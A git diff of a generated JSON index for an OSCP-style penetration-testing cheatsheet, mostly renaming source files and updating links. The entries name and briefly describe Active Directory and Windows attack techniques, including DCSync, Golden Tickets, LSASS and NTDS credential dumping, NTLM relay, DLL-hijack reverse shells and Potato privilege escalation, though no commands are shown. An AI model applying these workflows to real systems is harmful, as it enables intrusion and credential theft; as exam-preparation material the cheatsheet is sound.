@@ -1,6 +1,6 @@
 {
   "version": 1,
-  "generated_at": "2026-04-25T15:59:56.930Z",
+  "generated_at": "2026-04-25T19:48:57.650Z",
   "source_root": "../oscp-cheatsheet",
   "commands": [
     {
@@ -254,7 +254,7 @@
       "id": "note-active-directory-post-creds-enum-md-11",
       "title": "AD CS",
       "description": "Find vulnerable AD CS templates.",
-      "source": "Active Directory/Post_Creds_Enum.md",
+      "source": "Active Directory/Post-Creds Enum.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -429,7 +429,7 @@
       "id": "note-active-directory-post-creds-enum-md-10",
       "title": "ADPeas",
       "description": "Run ADPeas from a domain context, save output, then search for high-signal AD attack paths.",
-      "source": "Active Directory/Post_Creds_Enum.md",
+      "source": "Active Directory/Post-Creds Enum.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -466,7 +466,7 @@
       "id": "note-active-directory-initial-access-md-2",
       "title": "ASREPRoast",
       "description": "Request ASREP hashes for users without pre-auth, then crack them.",
-      "source": "Active Directory/Initial_Access.md",
+      "source": "Active Directory/Initial Access.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -575,7 +575,7 @@
       "id": "note-active-directory-initial-access-md-10",
       "title": "Bad-ODF NTLM Capture",
       "description": "Generate a malicious ODF document, upload it to a place the victim opens, capture NetNTLMv2, then crack it.",
-      "source": "Active Directory/Initial_Access.md",
+      "source": "Active Directory/Initial Access.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -607,7 +607,7 @@
       "id": "note-active-directory-post-creds-enum-md-1",
       "title": "BloodHound Collection",
       "description": "Collect BloodHound data with NetExec or `bloodhound-python`, then launch the GUI.",
-      "source": "Active Directory/Post_Creds_Enum.md",
+      "source": "Active Directory/Post-Creds Enum.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -724,7 +724,7 @@
       "id": "note-active-directory-lateral-movement-md-15",
       "title": "Credential Dumping After Local Admin",
       "description": "Dump local secrets remotely after confirming local admin access.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -831,7 +831,7 @@
       "id": "note-active-directory-lateral-movement-md-10",
       "title": "DCOM MMC20 Execution",
       "description": "Use the MMC20 DCOM object for remote command execution when you have the needed privileges.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -866,7 +866,7 @@
       "id": "note-active-directory-post-da-md-1",
       "title": "DCSync",
       "description": "Dump domain hashes with DCSync using Impacket, Mimikatz, or NetExec.",
-      "source": "Active Directory/Post_DA.md",
+      "source": "Active Directory/Post-DA.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1090,7 +1090,7 @@
       "id": "note-active-directory-post-da-md-12",
       "title": "Golden Ticket",
       "description": "Dump the `krbtgt` hash, forge a Golden Ticket, and use it for domain persistence.",
-      "source": "Active Directory/Post_DA.md",
+      "source": "Active Directory/Post-DA.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1128,7 +1128,7 @@
       "id": "note-active-directory-post-creds-enum-md-3",
       "title": "Kerberoast",
       "description": "Kerberoast with Impacket or NetExec, then crack the TGS hash.",
-      "source": "Active Directory/Post_Creds_Enum.md",
+      "source": "Active Directory/Post-Creds Enum.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1243,7 +1243,7 @@
       "id": "note-active-directory-initial-access-md-3",
       "title": "Kerbrute Password Attacks",
       "description": "Use Kerbrute for Kerberos password spray or a single-user brute force after checking lockout risk.",
-      "source": "Active Directory/Initial_Access.md",
+      "source": "Active Directory/Initial Access.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1280,7 +1280,7 @@
       "id": "note-active-directory-post-creds-enum-md-6",
       "title": "LDAP Enum With NetExec",
       "description": "Enumerate users and groups over LDAP.",
-      "source": "Active Directory/Post_Creds_Enum.md",
+      "source": "Active Directory/Post-Creds Enum.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1352,7 +1352,7 @@
       "id": "note-active-directory-post-creds-enum-md-9",
       "title": "LDAP Search With Credentials",
       "description": "Query LDAP directly when NetExec output is too broad or you need a specific OU/filter.",
-      "source": "Active Directory/Post_Creds_Enum.md",
+      "source": "Active Directory/Post-Creds Enum.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1462,7 +1462,7 @@
       "id": "note-active-directory-post-da-md-2",
       "title": "LSASS Dump With Mimikatz",
       "description": "Dump logon credentials with Mimikatz on DC.",
-      "source": "Active Directory/Post_DA.md",
+      "source": "Active Directory/Post-DA.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1498,7 +1498,7 @@
       "id": "note-active-directory-post-da-md-3",
       "title": "LSASS Minidump Offline Parse",
       "description": "Dump LSASS for offline parsing, then parse the minidump on the attacker box.",
-      "source": "Active Directory/Post_DA.md",
+      "source": "Active Directory/Post-DA.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1534,7 +1534,7 @@
       "id": "note-active-directory-lateral-movement-md-11",
       "title": "MSSQL xp_cmdshell",
       "description": "Use MSSQL admin access to enable `xp_cmdshell`, run commands, and execute a payload.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1571,7 +1571,7 @@
       "id": "note-active-directory-post-da-md-6",
       "title": "NTDS IFM Backup",
       "description": "Create an IFM backup on the DC for offline NTDS extraction.",
-      "source": "Active Directory/Post_DA.md",
+      "source": "Active Directory/Post-DA.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1607,7 +1607,7 @@
       "id": "note-active-directory-post-da-md-8",
       "title": "NTDS NetExec Dump",
       "description": "Dump only enabled accounts or use the VSS method with NetExec.",
-      "source": "Active Directory/Post_DA.md",
+      "source": "Active Directory/Post-DA.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1645,7 +1645,7 @@
       "id": "note-active-directory-post-da-md-10",
       "title": "NTDS NetExec Log Filtering",
       "description": "Filter enabled NTDS entries from NetExec output logs.",
-      "source": "Active Directory/Post_DA.md",
+      "source": "Active Directory/Post-DA.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1679,7 +1679,7 @@
       "id": "note-active-directory-post-da-md-9",
       "title": "NTDS Secretsdump VSS",
       "description": "Dump NTDS offline or use remote VSS when DCSync is not available but admin access exists.",
-      "source": "Active Directory/Post_DA.md",
+      "source": "Active Directory/Post-DA.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1713,7 +1713,7 @@
       "id": "note-active-directory-post-da-md-7",
       "title": "NTDS Shadow Copy Exfil",
       "description": "Create a shadow copy, copy `NTDS.dit` and `SYSTEM`, then exfiltrate them over SMB.",
-      "source": "Active Directory/Post_DA.md",
+      "source": "Active Directory/Post-DA.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1749,7 +1749,7 @@
       "id": "note-active-directory-initial-access-md-9",
       "title": "NTLM Relay With SMB Signing Disabled",
       "description": "Relay captured Net-NTLMv2 when SMB signing is disabled.",
-      "source": "Active Directory/Initial_Access.md",
+      "source": "Active Directory/Initial Access.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1783,7 +1783,7 @@
       "id": "note-active-directory-initial-access-md-4",
       "title": "Null Session To SYSVOL",
       "description": "Check anonymous SMB access, browse SYSVOL if allowed, and decrypt old GPP passwords if found.",
-      "source": "Active Directory/Initial_Access.md",
+      "source": "Active Directory/Initial Access.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1815,7 +1815,7 @@
       "id": "note-active-directory-lateral-movement-md-7",
       "title": "Overpass The Hash With Mimikatz",
       "description": "Use Mimikatz overpass-the-hash to spawn a Kerberos-capable PowerShell session, then reach another host.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1854,7 +1854,7 @@
       "id": "note-active-directory-lateral-movement-md-5",
       "title": "Pass The Hash",
       "description": "Test an NTLM hash, then use SMB/WMI execution if the account has admin rights.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1895,7 +1895,7 @@
       "id": "note-active-directory-lateral-movement-md-8",
       "title": "Pass The Key With Impacket",
       "description": "Get a TGT with an NTLM hash, then use the ticket with Kerberos-aware tools.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1932,7 +1932,7 @@
       "id": "note-active-directory-lateral-movement-md-9",
       "title": "Pass The Ticket",
       "description": "Export Kerberos tickets with Mimikatz, inject the useful CIFS ticket, and access the target share.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -1969,7 +1969,7 @@
       "id": "note-active-directory-initial-access-md-5",
       "title": "Password Spray",
       "description": "Check password policy, then spray one password across a user list.",
-      "source": "Active Directory/Initial_Access.md",
+      "source": "Active Directory/Initial Access.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2004,7 +2004,7 @@
       "id": "note-active-directory-initial-access-md-6",
       "title": "Password Spray Across Protocols",
       "description": "Spray one credential across common internal protocols and keep going after the first success.",
-      "source": "Active Directory/Initial_Access.md",
+      "source": "Active Directory/Initial Access.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2039,7 +2039,7 @@
       "id": "note-active-directory-post-creds-enum-md-8",
       "title": "PowerView",
       "description": "Load PowerView directly into memory and run quick domain checks.",
-      "source": "Active Directory/Post_Creds_Enum.md",
+      "source": "Active Directory/Post-Creds Enum.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2148,7 +2148,7 @@
       "id": "note-active-directory-lateral-movement-md-14",
       "title": "RDP",
       "description": "Check RDP access, and enable RDP through SMB only when you already have admin rights.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2185,7 +2185,7 @@
       "id": "note-active-directory-post-da-md-4",
       "title": "Remote LSASS Dump With Lsassy",
       "description": "Remote LSASS dump with lsassy.",
-      "source": "Active Directory/Post_DA.md",
+      "source": "Active Directory/Post-DA.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2225,7 +2225,7 @@
       "id": "note-active-directory-initial-access-md-8",
       "title": "Responder Net-NTLMv2 Capture",
       "description": "Capture Net-NTLMv2 with Responder and a coerced UNC path.",
-      "source": "Active Directory/Initial_Access.md",
+      "source": "Active Directory/Initial Access.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2257,7 +2257,7 @@
       "id": "note-active-directory-post-creds-enum-md-4",
       "title": "Rubeus Kerberos Checks",
       "description": "Use Rubeus from a Windows domain shell for roastable users, tickets, and pass-the-ticket workflows.",
-      "source": "Active Directory/Post_Creds_Enum.md",
+      "source": "Active Directory/Post-Creds Enum.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2296,7 +2296,7 @@
       "id": "note-active-directory-post-da-md-5",
       "title": "SAM + SYSTEM",
       "description": "Save SAM/SYSTEM hives and extract local hashes offline.",
-      "source": "Active Directory/Post_DA.md",
+      "source": "Active Directory/Post-DA.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2365,7 +2365,7 @@
       "id": "note-active-directory-post-creds-enum-md-2",
       "title": "SharpHound Collection",
       "description": "Collect BloodHound data from a Windows domain shell when Python collection is unreliable.",
-      "source": "Active Directory/Post_Creds_Enum.md",
+      "source": "Active Directory/Post-Creds Enum.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2402,7 +2402,7 @@
       "id": "note-active-directory-post-da-md-11",
       "title": "Silver Tickets",
       "description": "Forge and inject a Silver Ticket with a service account NTLM hash.",
-      "source": "Active Directory/Post_DA.md",
+      "source": "Active Directory/Post-DA.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2438,7 +2438,7 @@
       "id": "note-active-directory-post-creds-enum-md-5",
       "title": "SMB Enum With NetExec",
       "description": "Enumerate users, groups, and shares over SMB.",
-      "source": "Active Directory/Post_Creds_Enum.md",
+      "source": "Active Directory/Post-Creds Enum.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2477,7 +2477,7 @@
       "id": "note-active-directory-lateral-movement-md-4",
       "title": "SMB Remote Execution",
       "description": "Use psexec or NetExec for command execution after confirming admin rights.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2516,7 +2516,7 @@
       "id": "note-active-directory-initial-access-md-7",
       "title": "SMB/RPC User Enum",
       "description": "Try anonymous RPC user enum.",
-      "source": "Active Directory/Initial_Access.md",
+      "source": "Active Directory/Initial Access.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2548,7 +2548,7 @@
       "id": "note-active-directory-lateral-movement-md-13",
       "title": "Subnet Reuse With NTLM Hash",
       "description": "Sweep a subnet with an NTLM hash and test domain or local auth.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2589,7 +2589,7 @@
       "id": "note-active-directory-lateral-movement-md-12",
       "title": "Subnet Reuse With Password",
       "description": "Sweep a subnet with plaintext credentials and test domain or local auth.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2628,7 +2628,7 @@
       "id": "note-active-directory-post-creds-enum-md-12",
       "title": "SYSVOL Looting",
       "description": "Search SYSVOL for interesting files.",
-      "source": "Active Directory/Post_Creds_Enum.md",
+      "source": "Active Directory/Post-Creds Enum.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2773,7 +2773,7 @@
       "id": "note-active-directory-initial-access-md-1",
       "title": "User Enumeration",
       "description": "Enumerate valid usernames with Kerbrute before roasting or spraying.",
-      "source": "Active Directory/Initial_Access.md",
+      "source": "Active Directory/Initial Access.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2805,7 +2805,7 @@
       "id": "note-active-directory-lateral-movement-md-1",
       "title": "WinRM With Evil-WinRM",
       "description": "Check WinRM access and connect with Evil-WinRM.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2842,7 +2842,7 @@
       "id": "note-active-directory-lateral-movement-md-2",
       "title": "WinRM With PowerShell Remoting",
       "description": "Use native PowerShell remoting with a credential object.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2879,7 +2879,7 @@
       "id": "note-active-directory-lateral-movement-md-3",
       "title": "WinRM With WinRS",
       "description": "Use `winrs` for a simple remote shell or command execution over WinRM.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -2916,7 +2916,7 @@
       "id": "note-active-directory-lateral-movement-md-6",
       "title": "WMI Exec With Password",
       "description": "Use Impacket WMI execution with valid domain or local admin credentials.",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "source_type": "markdown",
       "tab": "Active Directory",
       "tags": [
@@ -6256,10 +6256,10 @@
       "lang": "cmd"
     },
     {
-      "id": "note-exploitation-textshaping-md-1",
+      "id": "note-privilege-escalation-textshaping-dll-hijack-md-1",
       "title": "Add Local Admin DLL",
       "description": "Step-by-step `TextShaping.dll` hijack to add a local admin user.",
-      "source": "Exploitation/TextShaping.md",
+      "source": "Privilege Escalation/TextShaping DLL Hijack.md",
       "source_type": "markdown",
       "tab": "Privesc",
       "tags": [
@@ -6771,10 +6771,10 @@
       "lang": "sh"
     },
     {
-      "id": "note-tools-potato-family-md-4",
+      "id": "note-privilege-escalation-potato-family-md-4",
       "title": "GodPotato",
       "description": "Use GodPotato when impersonation privileges are available on newer Windows builds.",
-      "source": "Tools/Potato Family.md",
+      "source": "Privilege Escalation/Potato Family.md",
       "source_type": "markdown",
       "tab": "Privesc",
       "tags": [
@@ -6801,10 +6801,10 @@
       "lang": "powershell"
     },
     {
-      "id": "note-tools-potato-family-md-5",
+      "id": "note-privilege-escalation-potato-family-md-5",
       "title": "JuicyPotato",
       "description": "Use JuicyPotato on older Windows builds when CLSID-based COM abuse is viable.",
-      "source": "Tools/Potato Family.md",
+      "source": "Privilege Escalation/Potato Family.md",
       "source_type": "markdown",
       "tab": "Privesc",
       "tags": [
@@ -7094,10 +7094,10 @@
       "lang": "sh"
     },
     {
-      "id": "note-exploitation-textshaping-md-2",
+      "id": "note-privilege-escalation-textshaping-dll-hijack-md-2",
       "title": "Reverse Shell DLL",
       "description": "Step-by-step `TextShaping.dll` hijack to get a reverse shell instead of adding a user.",
-      "source": "Exploitation/TextShaping.md",
+      "source": "Privilege Escalation/TextShaping DLL Hijack.md",
       "source_type": "markdown",
       "tab": "Privesc",
       "tags": [
@@ -7188,10 +7188,10 @@
       "lang": ""
     },
     {
-      "id": "note-tools-potato-family-md-1",
+      "id": "note-privilege-escalation-potato-family-md-1",
       "title": "SigmaPotato EXE",
       "description": "Check privileges, download SigmaPotato, and use it for admin or shell access.",
-      "source": "Tools/Potato Family.md",
+      "source": "Privilege Escalation/Potato Family.md",
       "source_type": "markdown",
       "tab": "Privesc",
       "tags": [
@@ -7218,10 +7218,10 @@
       "lang": "powershell"
     },
     {
-      "id": "note-tools-potato-family-md-2",
+      "id": "note-privilege-escalation-potato-family-md-2",
       "title": "SigmaPotato In Memory",
       "description": "Load SigmaPotato into memory and execute a command or reverse shell.",
-      "source": "Tools/Potato Family.md",
+      "source": "Privilege Escalation/Potato Family.md",
       "source_type": "markdown",
       "tab": "Privesc",
       "tags": [
@@ -7250,10 +7250,10 @@
       "lang": "powershell"
     },
     {
-      "id": "note-tools-potato-family-md-3",
+      "id": "note-privilege-escalation-potato-family-md-3",
       "title": "SigmaPotato PowerShell Wrapper",
       "description": "Download and run the PowerShell SigmaPotato wrapper when PowerShell execution is available.",
-      "source": "Tools/Potato Family.md",
+      "source": "Privilege Escalation/Potato Family.md",
       "source_type": "markdown",
       "tab": "Privesc",
       "tags": [
@@ -9942,7 +9942,7 @@
         {
           "type": "list",
           "items": [
-            "BloodHound collection commands now live in [[Post_Creds_Enum]].",
+            "BloodHound collection commands now live in [[../Post-Creds Enum]].",
             "This note is for what to look at after the data is loaded."
           ]
         },
@@ -9990,7 +9990,7 @@
         {
           "type": "list",
           "items": [
-            "Collection flow: [[Post_Creds_Enum]]",
+            "Collection flow: [[../Post-Creds Enum]]",
             "Edge abuse: [[Edges Privilege]]",
             "AD CS abuse: [[Certification - ADCS]]",
             "Full privesc pathing: [[Privesc]]"
@@ -10019,7 +10019,7 @@
         {
           "type": "list",
           "items": [
-            "AD CS enum and exploitation commands are already covered in [[Post_Creds_Enum]] and [[Privesc]].",
+            "AD CS enum and exploitation commands are already covered in [[../Post-Creds Enum]] and [[../Privesc]].",
             "This note keeps the attack path readable without duplicating the command blocks again."
           ]
         },
@@ -10045,7 +10045,7 @@
         {
           "type": "list",
           "items": [
-            "Enumeration step: [[Post_Creds_Enum]]",
+            "Enumeration step: [[../Post-Creds Enum]]",
             "Privilege escalation step: [[Privesc]]"
           ]
         }
@@ -10098,30 +10098,7 @@
           "type": "list",
           "items": [
             "Abuse commands: [[Privesc]]",
-            "Validate access and move laterally: [[Lateral_Movement]]"
-          ]
-        }
-      ]
-    },
-    {
-      "id": "note-active-directory-enumeration-checklist-md",
-      "title": "AD Enumeration Checklist",
-      "source": "Active Directory/Enumeration/Checklist.md",
-      "tab": "Active Directory",
-      "type": "checklist",
-      "tags": [
-        "ActiveDirectory",
-        "Enumeration"
-      ],
-      "blocks": [
-        {
-          "type": "list",
-          "items": [
-            "[ ] Identify domain and DC: [[Recon]]",
-            "[ ] Try SMB/RPC null enum: [[Active Directory/Enumeration/SMB Enum]]",
-            "[ ] Try LDAP enum: [[Active Directory/Enumeration/LDAP Enum]]",
-            "[ ] If shell exists, run Windows enum: [[Active Directory/Enumeration/Windows Enum]]",
-            "[ ] Save usernames, groups, shares, policy, and found files for later suggestions."
+            "Validate access and move laterally: [[../Lateral Movement]]"
           ]
         }
       ]
@@ -10538,7 +10515,7 @@
           "type": "list",
           "items": [
             "Generic Windows shell enum: [[../../Post-Exploitation/Windows Post-Exploitation]]",
-            "AD post-creds workflow: [[Post_Creds_Enum]]"
+            "AD post-creds workflow: [[../Post-Creds Enum]]"
           ]
         }
       ]
@@ -10546,7 +10523,7 @@
     {
       "id": "note-active-directory-initial-access-md",
       "title": "AD Initial Access",
-      "source": "Active Directory/Initial_Access.md",
+      "source": "Active Directory/Initial Access.md",
       "tab": "Active Directory",
       "type": "note",
       "tags": [
@@ -10587,7 +10564,7 @@
         {
           "type": "list",
           "items": [
-            "Got valid creds: [[Post_Creds_Enum]]",
+            "Got valid creds: [[Post-Creds Enum]]",
             "Got hash: [[../Credentials/Hash Crack]]"
           ]
         },
@@ -10845,7 +10822,7 @@
     {
       "id": "note-active-directory-lateral-movement-md",
       "title": "AD Lateral Movement",
-      "source": "Active Directory/Lateral_Movement.md",
+      "source": "Active Directory/Lateral Movement.md",
       "tab": "Active Directory",
       "type": "note",
       "tags": [
@@ -11311,7 +11288,7 @@
         {
           "type": "code",
           "lang": "text",
-          "text": "AD ports open? 88 / 389 / 445 / 5985\n  -> [[01_Recon]]\n  -> [[02_Initial_Access]]\n  -> got creds?\n  -> [[03_Post_Creds_Enum]]\n  -> got path?\n  -> [[04_Lateral_Movement]] <-> [[05_Privesc]]\n  -> got DA?\n  -> [[06_Post_DA]]"
+          "text": "AD ports open? 88 / 389 / 445 / 5985\n  -> [[Recon]]\n  -> [[Initial Access]]\n  -> got creds?\n  -> [[Post-Creds Enum]]\n  -> got path?\n  -> [[Lateral Movement]] <-> [[Privesc]]\n  -> got DA?\n  -> [[Post-DA]]"
         },
         {
           "type": "heading",
@@ -11350,7 +11327,7 @@
             "Local admin found: dump SAM/LSASS, then lateral movement.",
             "BloodHound path found: abuse edge in [[Privesc]].",
             "AD CS vulnerable: use ESC path in [[Bloodhound/Certification - ADCS]].",
-            "DA achieved: run [[Post_DA]]."
+            "DA achieved: run [[Post-DA]]."
           ]
         },
         {
@@ -11372,7 +11349,7 @@
     {
       "id": "note-active-directory-post-creds-enum-md",
       "title": "AD Post-Creds Enum",
-      "source": "Active Directory/Post_Creds_Enum.md",
+      "source": "Active Directory/Post-Creds Enum.md",
       "tab": "Active Directory",
       "type": "note",
       "tags": [
@@ -11413,7 +11390,7 @@
           "type": "list",
           "items": [
             "BloodHound path found: [[Privesc]]",
-            "Local admin found: [[Lateral_Movement]]",
+            "Local admin found: [[Lateral Movement]]",
             "Kerberos hash found: [[../Credentials/Hash Crack]]"
           ]
         },
@@ -11723,7 +11700,7 @@
     {
       "id": "note-active-directory-post-da-md",
       "title": "AD Post DA",
-      "source": "Active Directory/Post_DA.md",
+      "source": "Active Directory/Post-DA.md",
       "tab": "Active Directory",
       "type": "note",
       "tags": [
@@ -12150,7 +12127,7 @@
         {
           "type": "list",
           "items": [
-            "DA achieved: [[Post_DA]]"
+            "DA achieved: [[Post-DA]]"
           ]
         },
         {
@@ -12523,8 +12500,8 @@
         {
           "type": "list",
           "items": [
-            "Username list found: go to [[Initial_Access]].",
-            "Valid creds found: go to [[Post_Creds_Enum]]."
+            "Username list found: go to [[Initial Access]].",
+            "Valid creds found: go to [[Post-Creds Enum]]."
           ]
         },
         {
@@ -12721,7 +12698,8 @@
             "[ ] Build a username list.",
             "[ ] Try AS-REP roast and Kerberoast paths.",
             "[ ] Collect BloodHound data once creds are available.",
-            "[ ] Run post-creds enum from Windows if you have a shell."
+            "[ ] Run post-creds enum from Windows if you have a shell.",
+            "[ ] Save usernames, groups, shares, policy, and found files for later suggestions."
           ]
         },
         {
@@ -12808,6 +12786,115 @@
           "items": [
             "You have `users.txt`, domain name, DC IP/hostname, and password policy context.",
             "You know whether anonymous access, AS-REP roast, Kerberoast, or BloodHound gives a useful next path."
+          ]
+        }
+      ]
+    },
+    {
+      "id": "note-checklists-enumeration-checklist-md",
+      "title": "Enumeration Checklist",
+      "source": "Checklists/Enumeration Checklist.md",
+      "tab": "Checklists",
+      "type": "checklist",
+      "tags": [
+        "Enumeration"
+      ],
+      "blocks": [
+        {
+          "type": "list",
+          "items": [
+            "[ ] Start with [[../Enumeration/Nmap]].",
+            "[ ] Check web services with [[../Enumeration/Web]].",
+            "[ ] Check common service notes under [[../Enumeration/Services/21 - FTP|Services]].",
+            "[ ] If Windows/AD ports appear, check [[../Enumeration/SMB Enum|SMB Enum]] and [[../Enumeration/LDAP Enum|LDAP Enum]].",
+            "[ ] Save usernames, passwords, hashes, shares, hostnames, domains, and interesting files for later suggestions."
+          ]
+        }
+      ]
+    },
+    {
+      "id": "note-checklists-if-stuck-md",
+      "title": "If Stuck",
+      "source": "Checklists/If Stuck.md",
+      "tab": "Checklists",
+      "type": "checklist",
+      "tags": [
+        "Troubleshooting",
+        "Checklist"
+      ],
+      "blocks": [
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Fast Reroute"
+        },
+        {
+          "type": "list",
+          "items": [
+            "[ ] Re-check enum notes: [[../Enumeration/00_Index]]",
+            "[ ] Look for default creds or password guessing paths: [[../Initial Access/00_Index]]",
+            "[ ] Revisit credentials and hashes: [[../Credentials/00_Index]]",
+            "[ ] If you have a shell, move through post-exploitation and privesc: [[../Post-Exploitation/00_Index]], [[../Privilege Escalation/00_Index]]",
+            "[ ] If AD ports are present, follow the AD flow: [[../Active Directory/00_Index]]"
+          ]
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "General Reset"
+        },
+        {
+          "type": "list",
+          "items": [
+            "[ ] Search every non-standard app, permission, group, or version with `searchsploit` and web search.",
+            "[ ] Enumerate users again.",
+            "[ ] Crack every collected hash.",
+            "[ ] Re-test credential reuse carefully after checking lockout risk."
+          ]
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "AD Privesc / Post-Exploitation"
+        },
+        {
+          "type": "list",
+          "items": [
+            "[ ] If BloodHound or normal AD tooling is blocked, go back to basic Windows privesc.",
+            "[ ] Re-check service binary hijacking.",
+            "[ ] Re-check DLL hijacking.",
+            "[ ] Search `ProgramData` and application folders for hidden credentials.",
+            "[ ] Check registry autoruns.",
+            "[ ] Check scheduled tasks."
+          ]
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Standalone Exploit Failed"
+        },
+        {
+          "type": "list",
+          "items": [
+            "[ ] Confirm architecture: x86 vs x64.",
+            "[ ] Confirm exact target OS and service version.",
+            "[ ] Re-check shellcode, payload type, bad characters, and callback IP/port.",
+            "[ ] Review exploit notes and required offsets/options.",
+            "[ ] Try small exploit tweaks before abandoning the path."
+          ]
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Standalone Privesc Failed"
+        },
+        {
+          "type": "list",
+          "items": [
+            "[ ] If several vectors look promising but none work, assume enumeration is incomplete.",
+            "[ ] Re-run automated enum.",
+            "[ ] Manually review findings you previously dismissed as low value.",
+            "[ ] Run Windows privesc checks in this order when applicable: `PowerUp.ps1 -> SharpUp.exe -> winPEAS`."
           ]
         }
       ]
@@ -13521,28 +13608,6 @@
       ]
     },
     {
-      "id": "note-enumeration-checklists-to-do-md",
-      "title": "Enumeration Checklist",
-      "source": "Enumeration/Checklists - To Do.md",
-      "tab": "Enum",
-      "type": "checklist",
-      "tags": [
-        "Enumeration"
-      ],
-      "blocks": [
-        {
-          "type": "list",
-          "items": [
-            "[ ] Start with [[Nmap]].",
-            "[ ] Check web services with [[Web]].",
-            "[ ] Check common service notes under [[Services/21 - FTP|Services]].",
-            "[ ] If Windows/AD ports appear, check [[Enumeration/SMB Enum|SMB Enum]] and [[Enumeration/LDAP Enum|LDAP Enum]].",
-            "[ ] Save usernames, passwords, hashes, shares, hostnames, domains, and interesting files for later suggestions."
-          ]
-        }
-      ]
-    },
-    {
       "id": "note-enumeration-ldap-enum-md",
       "title": "LDAP Enum",
       "source": "Enumeration/LDAP Enum.md",
@@ -13590,8 +13655,8 @@
           "type": "list",
           "items": [
             "Need the command flow: [[../Active Directory/Enumeration/LDAP Enum]]",
-            "Need wider domain workflow: [[Post_Creds_Enum]]",
-            "Need first credential path: [[Initial_Access]]"
+            "Need wider domain workflow: [[../Active Directory/Post-Creds Enum]]",
+            "Need first credential path: [[../Active Directory/Initial Access]]"
           ]
         }
       ]
@@ -13755,7 +13820,7 @@
           "items": [
